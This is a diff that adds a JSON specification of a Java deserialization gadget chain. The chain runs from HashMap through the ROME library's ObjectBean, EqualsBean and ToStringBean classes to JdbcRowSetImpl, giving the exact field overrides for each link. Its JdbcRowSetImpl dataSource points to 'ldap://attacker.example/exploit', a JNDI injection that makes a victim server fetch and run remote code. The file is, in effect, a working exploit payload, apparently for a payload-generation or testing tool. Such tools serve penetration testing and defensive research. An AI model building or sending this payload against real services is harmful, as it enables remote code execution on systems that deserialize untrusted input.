@@ -1,0 +1,36 @@
+{
+    "chain_type": "ROME_JNDI — HashMap + ObjectBean/ToStringBean → JdbcRowSetImpl JNDI (no TemplatesImpl)",
+    "root_class": "java.util.HashMap",
+    "root_trigger": "readObject→putVal→ObjectBean.hashCode→EqualsBean.beanHashCode→ToStringBean.toString→JdbcRowSetImpl.getDatabaseMetaData",
+    "links": [
+        {
+            "class": "com.sun.syndication.feed.impl.ObjectBean",
+            "field_overrides": {
+                "_equalsBean": {"$ref": "link:1"},
+                "_toStringBean": {"$ref": "link:2"},
+                "_cloneableBean": null
+            }
+        },
+        {
+            "class": "com.sun.syndication.feed.impl.EqualsBean",
+            "field_overrides": {
+                "_beanClass": "com.sun.syndication.feed.impl.ToStringBean",
+                "_obj": {"$ref": "link:2"}
+            }
+        },
+        {
+            "class": "com.sun.syndication.feed.impl.ToStringBean",
+            "field_overrides": {
+                "_beanClass": "com.sun.rowset.JdbcRowSetImpl",
+                "_obj": {"$ref": "link:3"}
+            }
+        },
+        {
+            "class": "com.sun.rowset.JdbcRowSetImpl",
+            "field_overrides": {
+                "dataSource": "ldap://attacker.example/exploit"
+            }
+        }
+    ],
+    "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
